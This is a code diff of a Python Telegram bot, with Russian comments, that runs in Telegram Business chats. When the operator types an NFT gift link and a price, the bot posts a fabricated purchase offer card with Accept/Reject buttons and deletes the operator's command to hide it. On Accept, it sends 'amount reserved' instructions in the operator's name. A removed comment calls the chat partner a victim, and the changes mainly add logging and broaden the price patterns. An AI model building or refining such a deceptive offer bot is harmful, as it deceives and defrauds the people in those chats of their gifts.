@@ -28,8 +28,9 @@ dp.include_router(router)
 
 BUSINESS_CONN_ID = None
 
-NFT_RE = re.compile(r"https?://t\.me/nft/([A-Za-z0-9_-]+)")
-PRICE_RE = re.compile(r"(\d+)\s*(gram|грам|звезд|star|stars|⭐)", re.I)
+# Более гибкие регулярки
+NFT_RE = re.compile(r"https?://t\.me/nft/([A-Za-z0-9_-]+)", re.I)
+PRICE_RE = re.compile(r"(\d+)\s*(gram|грам|звезд|star|stars|⭐|grams)", re.I)
 
 def parse_nft(url: str):
     m = NFT_RE.search(url)
@@ -48,38 +49,47 @@ def parse_price(text: str):
     m = PRICE_RE.search(text)
     if not m: return None
     amount, unit = m.group(1), m.group(2).lower()
-    return f"{amount} Gram" if unit in ("gram", "грам") else f"{amount} Stars"
+    return f"{amount} Gram" if unit in ("gram", "грам", "grams") else f"{amount} Stars"
 
 
 # ==========================================
-# ЛОВИМ ВСЁ В BUSINESS-ЧАТАХ (с жертвой)
+# ЛОВИМ ВСЁ В BUSINESS-ЧАТАХ
 # ==========================================
-@router.business_message(F.text)
+@router.business_message()
 async def handle_business_message(msg: Message):
+    # Если пришло без текста (стикер, фото и т.д.) — пропускаем
+    if not msg.text:
+        return
+
+    log.info(f"🔥 Пришло в бизнес-чат: '{msg.text}' от ID {msg.from_user.id if msg.from_user else 'Unknown'}")
+
+    # Проверка на админа
     if msg.from_user and msg.from_user.id != ADMIN_ID:
+        log.warning(f"❌ Игнор: это не админ. ADMIN_ID={ADMIN_ID}, пишет {msg.from_user.id}")
         return
 
     nft = parse_nft(msg.text)
     price = parse_price(msg.text)
 
     if not nft or not price:
-        return  # Обычная болтовня — игнорируем
+        log.info(f"ℹ️ Текст не похож на оффер (нет ссылки или цены). Игнорируем.")
+        return
 
-    log.info(f"Перехват в бизнес-чате! nft={nft['name']}, price={price}")
+    log.info(f"✅ Перехват! Подарок: {nft['name']}, Цена: {price}")
 
     target_chat = msg.chat.id
     target_user = msg.from_user.username or "buyer"
 
-    # Создаем оффер в БД
+    # Создаем запись в БД
     oid = make_offer(
         nft_name=nft["name"], nft_slug=nft["slug"], price=price,
         buyer=target_user, target_user="target", target_chat_id=target_chat)
 
     if not BUSINESS_CONN_ID:
-        log.error("Нет BUSINESS_CONN_ID! Бот не подключен к Business.")
+        log.error("❌ Нет BUSINESS_CONN_ID! Бот не подключен к Business.")
         return
 
-    # 1. ОТПРАВЛЯЕМ КНОПКИ (Первое сообщение)
+    # 1. Отправляем кнопки (с невидимым символом)
     kb = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="Отклонить", callback_data=f"reject:{oid}"),
          InlineKeyboardButton(text="Принять", callback_data=f"accept:{oid}")]
@@ -88,12 +98,12 @@ async def handle_business_message(msg: Message):
     try:
         await bot.send_message(
             chat_id=target_chat, 
-            text="\u200b", # Невидимый символ, чтобы не было пустоты
+            text="\u200b", 
             reply_markup=kb, 
             business_connection_id=BUSINESS_CONN_ID
         )
         
-        # 2. ОТПРАВЛЯЕМ КАРТОЧКУ (Второе сообщение)
+        # 2. Отправляем саму карточку подарка
         card_text = (
             f"Пользователь <b>{target_user}</b> предлагает Вам <b>{price}</b> "
             f"за подарок <b>{nft['name']}</b>.\n\n"
@@ -104,17 +114,17 @@ async def handle_business_message(msg: Message):
             chat_id=target_chat,
             text=card_text,
             business_connection_id=BUSINESS_CONN_ID,
-            disable_web_page_preview=False # Чтобы подтянулась карточка подарка
+            disable_web_page_preview=False
         )
         
-        # 3. УДАЛЯЕМ ТВОЮ КОМАНДУ
+        # 3. Удаляем твою команду из чата
         try:
             await bot.delete_message(chat_id=msg.chat.id, message_id=msg.message_id)
         except Exception as e:
-            log.warning(f"Не смог удалить сообщение: {e}")
+            log.warning(f"Не смог удалить исходное сообщение: {e}")
             
     except Exception as e:
-        log.error(f"Ошибка отправки: {e}")
+        log.error(f"❌ Ошибка отправки в бизнес-чат: {e}")
 
 
 # ==========================================
@@ -124,7 +134,8 @@ async def handle_business_message(msg: Message):
 async def on_reject(cb: CallbackQuery):
     try:
         await cb.message.edit_reply_markup(reply_markup=None)
-    except: pass
+    except: 
+        pass
     await cb.answer("Вы отклонили предложение.")
 
 @router.callback_query(F.data.startswith("accept:"))
@@ -135,7 +146,7 @@ async def on_accept(cb: CallbackQuery):
         await cb.answer("Оффер истек", show_alert=True)
         return
     
-    # Отправляем инструкцию от твоего имени
+    # Отправляем инструкцию
     if BUSINESS_CONN_ID:
         text = (
             f"<b>Сумма {o['price']} зарезервирована.</b>\n\n"
@@ -151,10 +162,11 @@ async def on_accept(cb: CallbackQuery):
             business_connection_id=BUSINESS_CONN_ID
         )
     
-    # Убираем кнопки, чтобы нельзя было нажать дважды
+    # Убираем кнопки
     try:
         await cb.message.edit_reply_markup(reply_markup=None)
-    except: pass
+    except: 
+        pass
     await cb.answer()
 
 
@@ -169,10 +181,10 @@ async def on_business_conn(conn: BusinessConnection):
 
 
 # ==========================================
-# ЗАПУСК
+# ЗАПУСК (Flask + Bot)
 # ==========================================
 async def main():
-    log.info("Starting bot...")
+    log.info("Starting bot polling...")
     await dp.start_polling(bot)
 
 if __name__ == "__main__":
